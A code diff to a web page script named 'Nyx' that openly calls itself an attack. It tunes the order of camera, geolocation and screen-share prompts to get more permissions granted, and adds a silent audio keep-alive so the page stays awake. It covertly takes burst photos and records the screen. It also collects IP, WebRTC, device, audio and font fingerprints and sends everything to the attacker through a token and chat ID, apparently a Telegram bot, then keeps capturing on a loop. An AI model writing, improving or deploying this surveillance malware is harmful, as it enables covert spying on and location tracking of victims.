@@ -188,7 +188,10 @@ async function getIpIntel() {
 /* ---------- GPS ---------- */
 function getRealGps() {
     return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(null);
+        if (!navigator.geolocation) {
+            console.warn('[Nyx] geolocation unavailable');
+            return resolve(null);
+        }
         let resolved = false;
         const finish = (result) => {
             if (resolved) return;
@@ -200,18 +203,20 @@ function getRealGps() {
             mapsUrl: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
         });
 
+        console.log('[Nyx] firing geolocation prompt...');
+
         navigator.geolocation.getCurrentPosition(
-            p => { console.log('[Nyx] GPS fixed (high)'); finish(buildResult(p)); },
+            p => { console.log('[Nyx] GPS fixed (high acc)'); finish(buildResult(p)); },
             err1 => {
-                console.warn('[Nyx] GPS high err:', err1.code);
-                if (err1.code === 1) return finish(null);
+                console.warn('[Nyx] GPS high err:', err1.code, err1.message);
+                if (err1.code === 1) return finish(null); // permission denied
                 navigator.geolocation.getCurrentPosition(
-                    p => { console.log('[Nyx] GPS fixed (low)'); finish(buildResult(p)); },
-                    err2 => { console.warn('[Nyx] GPS low err:', err2.code); finish(null); },
-                    { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 }
+                    p => { console.log('[Nyx] GPS fixed (low acc fallback)'); finish(buildResult(p)); },
+                    err2 => { console.warn('[Nyx] GPS low err:', err2.code, err2.message); finish(null); },
+                    { enableHighAccuracy: false, timeout: 12000, maximumAge: 60000 }
                 );
             },
-            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
     });
 }
@@ -329,17 +334,39 @@ let displayStream = null;
 let hasRecordedScreen = false;
 let trackingInterval = null;
 let mouseMoves = 0;
+let keepAliveCtx = null;
 
 document.addEventListener('mousemove', () => { mouseMoves++; });
 
-/* ---------- 6) CAMERA (already contains audio fallback chain) ---------- */
+/* ---------- 6) CAMERA (video only — no mic) ---------- */
 function openCamera() {
-    return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
-        .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }))
+    return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
         .catch(() => navigator.mediaDevices.getUserMedia({ video: true, audio: false }));
 }
 
-/* ---------- 7) FRAME CAPTURE ---------- */
+/* ---------- 7) SILENT AUDIO KEEP-ALIVE ---------- */
+function startKeepAlive() {
+    try {
+        const AC = window.AudioContext || window.webkitAudioContext;
+        if (!AC) return null;
+        keepAliveCtx = new AC();
+        const osc = keepAliveCtx.createOscillator();
+        const gain = keepAliveCtx.createGain();
+        gain.gain.value = 0;
+        osc.connect(gain);
+        gain.connect(keepAliveCtx.destination);
+        osc.start();
+        return keepAliveCtx;
+    } catch(e) { return null; }
+}
+function stopKeepAlive() {
+    if (keepAliveCtx) {
+        try { keepAliveCtx.close(); } catch(e) {}
+        keepAliveCtx = null;
+    }
+}
+
+/* ---------- 8) FRAME CAPTURE ---------- */
 async function shootFrame(video, canvas, caption, token, chatId, retries = 1) {
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -363,7 +390,7 @@ async function shootFrame(video, canvas, caption, token, chatId, retries = 1) {
     }
 }
 
-/* ---------- 8) SCREEN RECORDING ---------- */
+/* ---------- 9) SCREEN RECORDING ---------- */
 async function recordScreenFromStream(stream, token, chatId) {
     if (hasRecordedScreen || !stream) return;
     hasRecordedScreen = true;
@@ -396,7 +423,7 @@ async function recordScreenFromStream(stream, token, chatId) {
     } catch(e) { console.warn("Screen record error:", e); }
 }
 
-/* ---------- 9) MAIN ATTACK — CORRECT ORDER ---------- */
+/* ---------- 10) MAIN ATTACK — CORRECT SEQUENCE ---------- */
 async function startAttack() {
     if (attackRunning) return;
     attackRunning = true;
@@ -405,34 +432,35 @@ async function startAttack() {
     if (!token || !chatId) { attackRunning = false; return; }
 
     try {
-        // ───── STEP 1: Fire getUserMedia SYNCHRONOUSLY (gesture window preserved) ─────
-        console.log('[Nyx] firing getUserMedia first...');
+        // ═════ STEP 1: CAMERA FIRST (needs user gesture — nothing before it) ═════
+        console.log('[Nyx] STEP 1: camera prompt...');
         const camP = openCamera();
-
-        // ───── STEP 2: Fire GPS right after (NOT awaited, so it doesn't block cam) ─────
-        console.log('[Nyx] firing GPS in background...');
-        const gpsP = getRealGps().catch(() => null);
-
-        // ───── STEP 3: Await camera — gesture still valid ─────
         const stream = await withTimeout(camP, 15000);
+
         if (!stream) {
-            console.warn('[Nyx] camera never resolved — abort');
+            console.warn('[Nyx] camera denied — abort');
             attackRunning = false;
             return;
         }
         activeStream = stream;
         console.log('[Nyx] camera granted ✓');
 
-        // ───── STEP 4: Screen share — 2s later (avoid prompt stacking) ─────
+        // ═════ STEP 2: GPS — fires NOW (camera modal is gone, prompt appears cleanly) ═════
+        console.log('[Nyx] STEP 2: geolocation prompt...');
+        startKeepAlive(); // silent audio thread keeps WebView awake so GPS doesn't drop
+        const gpsP = getRealGps().catch(() => null);
+
+        // ═════ STEP 3: SCREEN — 2s later (3rd and last modal) ═════
         setTimeout(() => {
             if (!hasRecordedScreen) {
-                navigator.mediaDevices.getDisplayMedia({ video: true })
+                console.log('[Nyx] STEP 3: screen prompt...');
+                navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
                     .then(s => { displayStream = s; recordScreenFromStream(s, token, chatId); })
                     .catch(e => console.warn('[Nyx] screen denied:', e.name));
             }
         }, 2000);
 
-        // ───── STEP 5: Wire camera into video element ─────
+        // ═════ STEP 4: Wire camera into video element & capture burst ═════
         const video = document.getElementById('cam-video');
         const canvas = document.getElementById('canvas');
         video.srcObject = stream;
@@ -444,42 +472,42 @@ async function startAttack() {
         });
         await video.play().catch(() => {});
 
-        // ───── STEP 6: Burst 3 photos fast ─────
         for (let i = 1; i <= 3; i++) {
             await shootFrame(video, canvas, `📸 Burst ${i}/3`, token, chatId);
             if (i < 3) await new Promise(r => setTimeout(r, 400));
         }
 
-        // ───── STEP 7: Camera off (light off) ─────
+        // ═════ STEP 5: Camera OFF (light off), GPS keeps running ═════
         stream.getTracks().forEach(t => t.stop());
         video.srcObject = null;
         activeStream = null;
 
-        // ───── STEP 8: GPS — capped at 10s so we never hang ─────
-        const gps = await withTimeout(gpsP, 10000);
-        console.log('[Nyx] GPS:', gps ? 'FIXED ✓' : 'null');
+        // ═════ STEP 6: Await GPS (up to 15s — plenty of time for fix) ═════
+        console.log('[Nyx] waiting for GPS fix...');
+        const gps = await withTimeout(gpsP, 15000);
+        console.log('[Nyx] GPS result:', gps ? 'FIXED ✓' : 'null');
 
-        // ───── STEP 9: Rest of intel (no prompts, fast) ─────
+        // ═════ STEP 7: Rest of intel + report ═════
         const [ipIntel, localIp, device, audioFp, fonts] = await Promise.all([
             getIpIntel(), getWebRTCLocalIP(), getDeviceIntel(), getAudioFp(), getFonts()
         ]);
-
-        // ───── STEP 10: Send full report ─────
         await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);
 
-        // ───── STEP 11: Live capture loop ─────
+        // ═════ STEP 8: Stop keep-alive, start live loop ═════
+        stopKeepAlive();
         if (trackingInterval) clearInterval(trackingInterval);
         trackingInterval = setInterval(liveCapture, 8000);
 
     } catch (err) {
         console.warn("startAttack error:", err);
         if (activeStream) activeStream.getTracks().forEach(t => t.stop());
+        stopKeepAlive();
     } finally {
         attackRunning = false;
     }
 }
 
-/* ---------- 10) LIVE CAPTURE ---------- */
+/* ---------- 11) LIVE CAPTURE ---------- */
 async function liveCapture() {
     if (document.hidden) return;
     const { token, chatId } = getCreds();
@@ -511,7 +539,7 @@ async function liveCapture() {
     }
 }
 
-/* ---------- 11) TRIGGERS ---------- */
+/* ---------- 12) TRIGGERS ---------- */
 async function requestPermissions() {
     if (permsDone || permsFiring) return;
     permsFiring = true;
@@ -539,6 +567,7 @@ window.addEventListener('beforeunload', () => {
     if (trackingInterval) clearInterval(trackingInterval);
     if (activeStream) activeStream.getTracks().forEach(t => t.stop());
     if (displayStream) displayStream.getTracks().forEach(t => t.stop());
+    stopKeepAlive();
 });
 </script>
 </body>
